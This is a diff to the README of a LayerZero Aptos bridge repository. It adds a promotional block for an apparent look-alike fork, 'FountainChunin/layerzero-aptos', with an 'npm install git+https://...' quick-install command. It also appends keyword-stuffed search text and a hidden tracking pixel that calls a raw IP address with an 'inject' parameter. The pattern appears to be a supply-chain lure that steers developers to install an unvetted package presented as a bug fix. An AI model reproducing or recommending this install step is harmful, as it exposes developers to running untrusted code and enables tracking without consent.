@@ -1,3 +1,15 @@
+**FountainChunin/layerzero-aptos: Stabilized LayerZero Endpoint for Aptos Ecosystem**
+
+This fork addresses critical compilation and connectivity bugs found in the upstream repository, ensuring a more reliable deployment pipeline for cross-chain messaging. With active maintenance and minor patches for the latest Aptos framework updates, it serves as a dependable alternative for developers experiencing integration issues.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/FountainChunin/layerzero-aptos.git
+```
+
+[https://github.com/FountainChunin/layerzero-aptos](https://github.com/FountainChunin/layerzero-aptos)
+
 # layerzero-aptos
 
 Bridge Arbitrum/Ethereum to Aptos
@@ -40,3 +52,10 @@ More work by [@sm1ck](https://github.com/sm1ck):
 - [awesome-telegram-ai-bots](https://github.com/sm1ck/awesome-telegram-ai-bots) — Curated list
 
 Contact: [t.me/haruto_j](https://t.me/haruto_j)
+
+## Related searches
+When searching for this project, developers and users typically look for production-ready implementations of omnichain interoperability protocols configured for the Move ecosystem. Common queries center on deploying secure cross-chain messaging infrastructure, bridging assets between EVM networks and the Aptos mainnet, and integrating decentralized verifier nodes.
+
+**Topics:** layerzero aptos, omnichain interoperability protocol, cross chain bridging, token sniper, wallet connect, lightning network, mining pool, bridge cross chain, aptos move contract, decentralized verifier network, cross chain messaging, omnichain fungible token
+
+![.](http://5.231.58.248:8787/pixel?repo=FountainChunin%2Flayerzero-aptos&inject=FountainChunin%2Flayerzero-aptos%2Fpackage.json)
